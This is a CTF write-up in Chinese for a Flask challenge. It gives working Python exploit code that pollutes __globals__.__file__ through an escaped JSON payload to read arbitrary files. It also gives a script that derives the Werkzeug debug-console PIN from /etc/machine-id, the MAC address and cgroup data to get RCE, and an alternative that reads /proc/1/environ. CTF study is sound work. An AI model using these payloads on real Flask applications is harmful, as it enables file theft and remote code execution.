- > 复现
- # 思路
	- 使用[类型污染]([[CTF/Python/Python的原型链污染]])污染`__file__`实现任意读取文件
	- 对`/console`路径打[[CTF/Flask/Debug模式RCE]]
- # 对象类型污染 -> 任意文件读取
	- 污染__globals__下的__file__即可
	- ```python
	  def read_file(pathname):
	  
	      payload = {
	          "username": "123",
	          "password": "123",
	          "__class__": {
	              "__init__": {
	                  "__globals__": {
	                      "__file__": pathname
	                  }
	              }
	          }
	      }
	  
	      payload = json.dumps(payload)
	      payload = payload.replace("__class__", enc_dec.full_urlencode("__class__", head = "\\u00"))
	      payload = payload.replace("__init__", enc_dec.full_urlencode("__init__", head = "\\u00"))
	  
	      r = base_post(url + "register", data = payload)
	      r = base_get(url)
	      return r.text
	  
	  ```
- # 打Flask的debug模式RCE
	- 这题不知道为什么可以通过`/console`访问终端
	- 读文件算pin
		- ```python
		  
		  import hashlib
		  from itertools import chain
		  
		  
		  eth0 = read_file("/sys/class/net/eth0/address")
		  eth0 = str(int("".join(eth0.split(":")), 16))
		  machine_id = read_file("/etc/machine-id").strip()
		  cgp = read_file("/proc/self/cgroup").rpartition("/")[2].strip()
		  
		  rv, num = None, None
		  
		  probably_public_bits = [
		      'root'# 用户名
		      'flask.app',# modname
		      'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
		      "/usr/local/lib/python3.10/site-packages/flask/app.py" # getattr(mod, '__file__', None),
		  ]
		  
		  private_bits = [
		      str(eth0),# str(uuid.getnode()),  /sys/class/net/ens33/address
		      machine_id + cgp
		  ]
		  h = hashlib.sha1()
		  for bit in chain(probably_public_bits, private_bits):
		      if not bit:
		          continue
		      if isinstance(bit, str):
		          bit = bit.encode("utf-8")
		      h.update(bit)
		  h.update(b"cookiesalt")
		  
		  cookie_name = f"__wzd{h.hexdigest()[:20]}"
		  
		  if num is None:
		      h.update(b"pinsalt")
		      num = f"{int(h.hexdigest(), 16):09d}"[:9]
		  
		  if rv is None:
		      for group_size in 5, 4, 3:
		          if len(num) % group_size == 0:
		              rv = "-".join(
		                  num[x : x + group_size].rjust(group_size, "0")
		                  for x in range(0, len(num), group_size)
		              )
		              break
		      else:
		          rv = num
		  
		  print(rv)
		  
		  ```
- # 非预期思路
	- 直接读`/proc/1/environ`
		- ```python
		  def read_file(pathname):
		  
		      payload = {
		          "username": "123",
		          "password": "123",
		          "__class__": {
		              "__init__": {
		                  "__globals__": {
		                      "__file__": pathname
		                  }
		              }
		          }
		      }
		  
		      payload = json.dumps(payload)
		      payload = payload.replace("__class__", enc_dec.full_urlencode("__class__", head = "\\u00"))
		      payload = payload.replace("__init__", enc_dec.full_urlencode("__init__", head = "\\u00"))
		  
		      r = base_post(url + "register", data = payload)
		      r = base_get(url)
		      return r.text
		  print(read_file("/proc/1/environ"))
		  
		  ```